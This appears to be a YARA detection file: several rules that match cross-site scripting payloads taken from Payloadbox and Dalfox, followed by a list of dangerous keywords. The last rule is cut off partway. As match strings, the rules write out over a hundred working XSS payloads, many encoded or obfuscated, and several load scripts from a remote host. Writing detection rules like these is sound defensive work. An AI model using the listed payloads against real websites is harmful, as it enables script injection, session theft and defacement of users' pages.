...
rule Detect_XSS_Payloads2
{
    meta:
        description = "Detects XSS attack payloads Encoded"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        reference = "Payloadbox xss"

    strings:
        $payload1 = "\\\\\";alert('XSS');\\\\"
        $payload2 = "&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\"XSS\");&lt;/SCRIPT&gt;"
        $payload3 = "&lt;SCRIPT&gt;alert(/XSS/&#46;source)&lt;/SCRIPT&gt;"
        $payload4 = "&lt;INPUT TYPE=\"IMAGE\" SRC=\"javascript&#058;alert('XSS');\"&gt;"
        $payload5 = "&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;"
        $payload6 = "&lt;BODY ONLOAD=alert('XSS')&gt;"
        $payload7 = "&lt;IMG DYNSRC=\"javascript&#058;alert('XSS')\"&gt;"
        $payload8 = "&lt;IMG LOWSRC=\"javascript&#058;alert('XSS')\"&gt;"
        $payload9 = "&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;"
        $payload10 = "&lt;BR SIZE=\"&{alert('XSS')}\"&gt;"
        $payload11 = "&lt;LAYER SRC=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/LAYER&gt;"
        $payload12 = "&lt;LINK REL=\"stylesheet\" HREF=\"javascript&#058;alert('XSS');\"&gt;"
        $payload13 = "&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;"
        $payload14 = "&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;"
        $payload15 = "&lt;META HTTP-EQUIV=\"Link\" Content=\"&lt;http&#58;//ha&#46;ckers&#46;org/xss&#46;css&gt;; REL=stylesheet\"&gt;"
        $payload16 = "&lt;STYLE&gt;BODY{-moz-binding&#58;url(\"http&#58;//ha&#46;ckers&#46;org/xssmoz&#46;xml#xss\")}&lt;/STYLE&gt;"
        $payload17 = "&lt;XSS STYLE=\"behavior&#58; url(xss&#46;htc);\"&gt;"
        $payload18 = "&lt;STYLE&gt;li {list-style-image&#58; url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS"
        $payload19 = "&lt;IMG SRC='vbscript&#058;msgbox(\"XSS\")'&gt;"
        $payload20 = "&lt;IMG SRC=\"mocha&#58;&#91;code&#93;\"&gt;"
        $payload21 = "&lt;IMG SRC=\"livescript&#58;&#91;code&#93;\"&gt;"
        $payload22 = "&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript&#058;alert('XSS');\"&gt;"
        $payload23 = "&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data&#58;text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\"&gt;"
        $payload24 = "&lt;META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http&#58;//;URL=javascript&#058;alert('XSS');\""
        $payload25 = "&lt;IFRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/IFRAME&gt;"
        $payload26 = "&lt;FRAMESET&gt;&lt;FRAME SRC=\"javascript&#058;alert('XSS');\"&gt;&lt;/FRAMESET&gt;"
        $payload27 = "&lt;TABLE BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;"
        $payload28 = "&lt;TABLE&gt;&lt;TD BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;"
        $payload29 = "&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;"
        $payload30 = "&lt;DIV STYLE=\"background-image&#58;&#92;0075&#92;0072&#92;006C&#92;0028&#39;&#006a&#0061&#0076&#0061&#0073&#0063&#0072&#0069&#0070&#0074&#003a&#0061&#006c&#0065&#0072&#0074&#0028&#46;&#0027;&#01027&#0058;&#01053&#0053;&#0027;&#0029&#39;&#0029\"&gt;"
        $payload31 = "&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;"
        $payload32 = "&lt;DIV STYLE=\"width&#58; expression(alert('XSS'));\"&gt;"
        $payload33 = "&lt;STYLE&gt;@im\\port'\\ja\\vasc\\ript&#58;alert(\"XSS\")';&lt;/STYLE&gt;\";"
        $payload34 = "&lt;IMG STYLE=\"xss&#58;expr/*XSS*/ession(alert('XSS'))\"&gt;"
        $payload35 = "&lt;XSS STYLE=\"xss&#58;expression(alert('XSS'))\"&gt;"
        $payload36 = "exp/*&lt;A STYLE='no\\xss\\3A noxss(\"*//*\");\";"
        $payload37 = "xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;"
        $payload38 = "&lt;STYLE TYPE=\"text/javascript\"&gt;alert('XSS');&lt;/STYLE&gt;"
        $payload39 = "&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\"javascript&#058;alert('XSS')\");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;"
        $payload40 = "&lt;STYLE type=\"text/css\"&gt;BODY{background&#58;url(\"javascript&#058;alert('XSS')\")}&lt;/STYLE&gt;"
        $payload41 = "&lt;!--&#91;if gte IE 4&#93;&gt;"
        $payload42 = "&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;"
        $payload43 = "&lt;!&#91;endif&#93;--&gt;"
        $payload44 = "&lt;BASE HREF=\"javascript&#058;alert('XSS');//\"&gt;"
        $payload45 = "&lt;OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/OBJECT&gt;"
        $payload46 = "&lt;OBJECT classid=clsid&#58;ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript&#058;alert('XSS')&gt;&lt;/OBJECT&gt;"
        $payload47 = "&lt;EMBED SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;swf\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;"
        $payload48 = "&lt;EMBED SRC=\"data&#58;image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"&gt;&lt;/EMBED&gt;"
        $payload49 = "a=\"get\";"
        $payload50 = "b=\"URL(\"\";"
        $payload51 = "c=\"javascript&#058;\";"
        $payload52 = "d=\"alert('XSS');\")\";"
        $payload53 = "eval(a+b+c+d);"
        $payload54 = "&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\"xss\" implementation=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\"&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;"
        $payload55 = "&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\"javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('XSS');\"&gt;&#93;&#93;&gt;"
        $payload56 = "&lt;/C&gt;&lt;/X&gt;&lt;/xml&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;"
        $payload57 = "&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript&#58;alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;"
        $payload58 = "&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;"
        $payload59 = "&lt;XML SRC=\"xsstest&#46;xml\" ID=I&gt;&lt;/XML&gt;"
        $payload60 = "&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;"
        $payload61 = "&lt;HTML&gt;&lt;BODY&gt;"
        $payload62 = "&lt;?xml&#58;namespace prefix=\"t\" ns=\"urn&#58;schemas-microsoft-com&#58;time\"&gt;"
        $payload63 = "&lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;"
        $payload64 = "&lt;t&#58;set attributeName=\"innerHTML\" to=\"XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;\"&gt;"
        $payload65 = "&lt;/BODY&gt;&lt;/HTML&gt;"
        $payload66 = "&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;"
        $payload67 = "&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;"
        $payload68 = "&lt;? echo('&lt;SCR)';"
        $payload69 = "echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;"
        $payload70 = "&lt;IMG SRC=\"http&#58;//www&#46;thesiteyouareon&#46;com/somecommand&#46;php?somevariables=maliciouscode\"&gt;"
        $payload71 = "Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser"
        $payload72 = "&lt;META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\"&gt;"
        $payload73 = "&lt;HEAD&gt;&lt;META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"
        $payload74 = "&lt;SCRIPT a=\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;"
        $payload75 = "&lt;SCRIPT =\"&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;"
        $payload76 = "&lt;SCRIPT a=\"&gt;\" '' SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;"
        $payload77 = "&lt;SCRIPT \"a='&gt;'\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;"
        $payload78 = "&lt;SCRIPT a=`&gt;` SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;"
        $payload79 = "&lt;SCRIPT a=\"&gt;'&gt;\" SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;"
        $payload80 = "&lt;SCRIPT&gt;document&#46;write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;"
        $payload81 = "&lt;A HREF=\"http&#58;//66&#46;102&#46;7&#46;147/\"&gt;XSS&lt;/A&gt;"
        $payload82 = "&lt;A HREF=\"http&#58;//%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/A&gt;"
        $payload83 = "&lt;A HREF=\"http&#58;//1113982867/\"&gt;XSS&lt;/A&gt;"
        $payload84 = "&lt;A HREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;"
        $payload85 = "&lt;A HREF=\"http&#58;//0102&#46;0146&#46;0007&#46;00000223/\"&gt;XSS&lt;/A&gt;"
        $payload86 = "&lt;A HREF=\"htt p&#58;//6 6&#46;000146&#46;0x7&#46;147/\"&gt;XSS&lt;/A&gt;"
        $payload87 = "&lt;A HREF=\"//www&#46;google&#46;com/\"&gt;XSS&lt;/A&gt;"
        $payload88 = "&lt;A HREF=\"//google\"&gt;XSS&lt;/A&gt;"
        $payload89 = "&lt;A HREF=\"http&#58;//ha&#46;ckers&#46;org@google\"&gt;XSS&lt;/A&gt;"
        $payload90 = "&lt;A HREF=\"http&#58;//google&#58;ha&#46;ckers&#46;org\"&gt;XSS&lt;/A&gt;"
        $payload91 = "&lt;A HREF=\"http&#58;//google&#46;com/\"&gt;XSS&lt;/A&gt;"
        $payload92 = "&lt;A HREF=\"http&#58;//www&#46;google&#46;com&#46;/\"&gt;XSS&lt;/A&gt;"
        $payload93 = "&lt;A HREF=\"javascript&#058;document&#46;location='http&#58;//www&#46;google&#46;com/'\"&gt;XSS&lt;/A&gt;"
        $payload94 = "&lt;A HREF=\"http&#58;//www&#46;gohttp&#58;//www&#46;google&#46;com/ogle&#46;com/\"&gt;XSS&lt;/A&gt;"
        $payload95 = "&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;"
        $payload96 = "&lt;IMG SRC=\"javascript&#058;alert('XSS')\""
        $payload97 = "&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;"
        $payload98 = "&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;"
        $payload99 = "&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;"
        $payload100 = "&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;"
        $payload101 = "&lt;BODY onload!#$%&()*~+-_.,;?@[/|]^`=alert(&quot;XSS&quot;)&gt;\";"
        $payload102 = "&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;"
        $payload103 = "&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;"
        $payload104 = "perl -e 'print \"<SCR\\0IPT>alert(\\\"XSS\\\")<\\/SCR\\0IPT>\";' > out\";"
        $payload105 = "perl -e 'print \"<IMG SRC=java\\0script&#058;alert(\\\"XSS\\\")>\";' > out\";"
        $payload106 = "&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;"
        $payload107 = "&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;"
        $payload108 = "&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;"
        $payload109 = "&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;&gt;"
        $payload110 = "&lt;IMG SRC=&#0000106;&#0000097;&#0000118;&#0000097;&#0000115;&#0000099;&#0000114;&#0000105;&#0000112;&#0000116;&#0000058;&#0000097;&#0000108;&#0000101;&#0000114;&#0000116;&#0000040;&#0000039;&#0000088;&#0000083;&#0000083;&#0000039;&#0000041;&gt;"
        $payload111 = "&lt;IMG SRC=javascript&#058;alert('XSS')&gt;"
        $payload112 = "&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;"
        $payload113 = "&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;"
        $payload114 = "&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;"
        $payload115 = "&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;"
        $payload116 = "&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;"
        $payload117 = "&lt;IMG SRC=javascript&#058;alert('XSS')&gt;"
        $payload118 = "&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;"
        $payload119 = "&lt;xmp&gt;&lt;p title=&quot;&lt;/xmp&gt;&lt;svg/onload=alert(1)&gt;"
        $payload120 = "&lt;/ScriPt&gt;&lt;sCripT id=dalfox&gt;alert(1)&lt;/sCriPt&gt;"
        $payload121 = "&lt;iFrAme/src=jaVascRipt:alert.bind()(1) class=dalfox&gt;&lt;/iFramE&gt;"
        $payload122 = "\"&gt;&lt;script y=\"&gt;&lt;\"/*<script* */prompt()</script>"
        $payload123 = "\"&gt;&lt;d3\"\"/onclick=\"&gt;[confirm``]\"&lt;\"z"
        $payload124 = "&lt;sVg/onload=alert(1) class=dalfox&gt;"
        $payload125 = "&#34;&gt;&lt;img/src/onerror=.1|alert`` class=dalfox&gt;"
        $payload126 = "&#39;&#34;&gt;&lt;img/src/onerror=.1|alert`` class=dalfox&gt;"
        $payload127 = "&lt;sVg/onload=prompt(1) class=dalfox&gt;"
        $payload128 = "&lt;ScRipt class=dalfox&gt;prompt(1)&lt;/script&gt;"
        $payload129 = "&lt;iFrAme/src=jaVascRipt:print(1) class=dalfox&gt;&lt;/iFramE&gt;"
        $payload130 = "<;ScRipt&gt;prompt.valueOf()(1)&lt;/script&gt;"
        $payload131 = "\"&gt;&lt;d3\"\"/onclick=\"&gt;[confirm``]\"&lt;\"z"
        $payload132 = "<ScRipt>alert.bind()(1);/script%3"
        $payload133 = "&lt;audio controls ondurationchange=alert(1) id=dalfox&gt;&lt;source src=1.mp3 type=audio/mpeg&gt;&lt;/audio&gt;"
        $payload134 = "%3C%69%46%72%41%6D%65%2F%73%72%63%3D%6A%61%56%61%73%63%52%69%70%74%3A%70%72%69%6E%74%28%31%29%20%63%6C%61%73%73%3D%64%61%6C%66%6F%78%3E%3C%2F%69%46%72%61%6D%45%3E"
        $payload135 = "%3C%2F%53%63%72%69%50%74%3E%3C%73%43%72%69%70%54%20%69%64%3D%64%61%6C%66%6F%78%3E%61%6C%65%72%74%28%31%29%3C%2F%73%43%72%69%50%74%3E"
        $payload136 = "%3C%78%6D%70%3E%3C%70%20%74%69%74%6C%65%3D%22%3C%2F%78%6D%70%3E%3C%73%76%67%2F%6F%6E%6C%6F%61%64%3D%70%72%69%6E%74%28%31%29%3E"
        $payload137 = "&lt;xmp&gt;&lt;p title=&#34;&lt;/xmp&gt;&lt;svg/onload=prompt.valueOf()(1)&gt;"

    condition:
    any of them
}

rule Detect_XSS_Payloads3 {
    meta:
        description = "Detect common XSS payloads"
        author = "Arkaan Nabiil, Bintang Hermawan Makmur, Putu Indra Yudananta"
        date = "Payloadbox n Dalfox"

    strings:
        $payload1 = "<xmp><p title=\"</xmp><svg/onload=alert(1)>"
        $payload2 = "</ScriPt><sCripT id=dalfox>alert(1)</sCriPt>"
        $payload3 = "&lt;iFrAme/src=jaVascRipt:alert.bind()(1) class=dalfox&gt;&lt;/iFramE&gt;"
        $payload4 = "\"><script y=\"><\">/<script /prompt()</script"
        $payload5 = "\"><d3\"<\"/onclick=\"><[confirm]\"<\">z"
        $payload6 = "/<sVg/onload=(alert|prompt|bind)+ class=dalfox>/"
        $payload7 = "&#34;&gt;&lt;img/src/onerror=.1|alert class=dalfox&gt;"
        $payload8 = "&#39;&#34;&gt;&lt;img/src/onerror=.1|alert class=dalfox&gt;"
        $payload9 = "<sVg/onload=prompt(1) class=dalfox>"
        $payload10 = "<ScRipt class=dalfox>prompt(1)</script>"
        $payload11 = "<iFrAme/src=jaVascRipt:print(1) class=dalfox></iFramE>"
        $payload12 = "<ScRipt>prompt.valueOf()(1)</script>"
        $payload13 = "\"><d3\"<\"/onclick=\"><[confirm]\"<\">z"
        $payload14 = "<ScRipt>alert.bind()(1)</script%3"
        $payload15 = "<audio controls ondurationchange=alert(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>"
        $payload16 = "%3C%69%46%72%41%6D%65%2F%73%72%63%3D%6A%61%56%61%73%63%52%69%70%74%3A%70%72%69%6E%74%28%31%29%20%63%6C%61%73%73%3D%64%61%6C%66%6F%78%3E%3C%2F%69%46%72%61%6D%45%3E"
        $payload17 = "%3C%2F%53%63%72%69%50%74%3E%3C%73%43%72%69%70%54%20%69%64%3D%64%61%6C%66%6F%78%3E%61%6C%65%72%74%28%31%29%3C%2F%73%43%72%69%50%74%3E"
        $payload18 = "%3C%78%6D%70%3E%3C%70%20%74%69%74%6C%65%3D%22%3C%2F%78%6D%70%3E%3C%73%76%67%2F%6F%6E%6C%6F%61%64%3D%70%72%69%6E%74%28%31%29%3E"
        $payload19 = "&lt;xmp&gt;&lt;p title=&#34;&lt;/xmp&gt;&lt;svg/onload=prompt.valueOf()(1)&gt;"
        $payload20 = "onload="
...
rule Dangerous_XSS_Payloads {
    ...
    strings:
        ...
        $payload4 = "\"><script y=\"><\">/*<script* */prompt()</script"
        $payload5 = "\"><d3\"<\"/onclick=\"><[confirm``]\"<\">z"
        $payload6 = "<sVg/onload=alert(1) class=dalfox>"
        $payload7 = "&#34;&gt;&lt;img/src/onerror=.1|alert`` class=dalfox&gt;"
        $payload8 = "&#39;&#34;&gt;&lt;img/src/onerror=.1|alert`` class=dalfox&gt;"
        $payload9 = "<sVg/onload=prompt(1) class=dalfox>"
        $payload10 = "<ScRipt class=dalfox>prompt(1)</script>"
        ...
        $payload18 = "%3C%78%6D%70%3E%3C%70%20%74%69%74%6C%65%3D%22%3C%2F%78%6D%70%3E%3C%73%76%67%2F%6F%6E%6C%6F%61%64%3D%70%72%69%6E%74%28%31%29%3E"
        $payload19 = "&lt;xmp&gt;&lt;p title=&#34;&lt;/xmp&gt;&lt;svg/onload=prompt.valueOf()(1)&gt;"
        $dangerous_keyword1 = "<script>"
        $dangerous_keyword2 = "</script>"
        $dangerous_keyword3 = "<iframe>"
        $dangerous_keyword4 = "</iframe>"
        $dangerous_keyword5 = "javascript:"
        $dangerous_keyword6 = "onload="
        $dangerous_keyword7 = "onerror="
        $dangerous_keyword8 = "alert("
        $dangerous_keyword9 = "prompt("
        $dangerous_keyword10 = "confirm("
        $dangerous_keyword11 = "print("
